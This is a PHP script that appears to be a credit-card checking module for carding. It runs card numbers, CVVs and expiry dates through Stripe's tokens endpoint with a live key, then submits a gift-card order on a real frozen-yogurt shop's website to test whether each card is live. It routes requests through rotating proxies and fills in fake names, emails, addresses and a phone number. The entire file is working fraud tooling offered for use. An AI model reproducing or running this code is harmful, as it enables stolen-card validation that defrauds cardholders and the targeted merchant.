<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) $retry++;

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$data = 'card[name]='.$fake->first.'+'.$fake->last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F1104f1bb4%3B+stripe-js-v3%2F1104f1bb4&time_on_page='.rand(50000, 100000).'&key=pk_live_mUnBM31MUBcKBMhGFUOzoFbB';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/tokens', $data, null, null, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id)) goto start;

$tok = $json_r1->id;

$brand = $json_r1->card->brand;

$r2 = $this->curlx->Get('https://kiwifrozenyogurt.com/gift-cards/', null, null, $server['proxy']);

if (!$r2->success) goto start;

$state_1 = trim(strip_tags($this->getstr($r2->body, "state_1' value='", "'")));

if (empty($state_1)) {
	$empty = 'Second Request Token is Empty';

	goto start;
}

$data = [
	'input_5' => 'Other|0',
	'input_7' => '1',
	'input_23' => 'none',
	'input_6' => 'USPS First Class - $0.00|0',
	'input_2' => '1',
	'input_8.1' => '12 main street',
	'input_8.3' => 'Brewster',
	'input_8.4' => 'New York',
	'input_8.5' => '10509',
	'input_8.6' => 'United States',
	'input_9_copy_values_activated' => '1',
	'input_9.1' => '',
	'input_9.3' => '',
	'input_9.4' => 'Pennsylvania',
	'input_9.5' => '',
	'input_9.6' => 'United States',
	'input_13' => $fake->first,
	'input_14' => $fake->last,
	'input_10' => $fake->email,
	'input_11' => '(256) 456-7654',
	'is_submit_1' => '1',
	'gform_submit' => '1',
	'gform_unique_id' => '',
	'state_1' => $state_1,
	'gform_target_page_number_1' => '0',
	'gform_source_page_number_1' => '1',
	'gform_field_values' => '',
	'stripe_credit_card_last_four' => $last4,
	'stripe_credit_card_type' => $brand,
	'stripe_response' => $r1->body
];

$r3 = $this->curlx->Post('https://kiwifrozenyogurt.com/gift-cards/', http_build_query($data), null, null, $server['proxy']);

if (!$r3->success || empty($r3->body)) goto start;

$err = empty($tmp = trim(strip_tags($this->getstr($r3->body, "validation_message'>", "<")))) ? trim(strip_tags($this->getstr($r3->body, "'validation_error'>", "<"))) : $tmp;

$status = $this->response->Stripe($r3->body, $err);

end: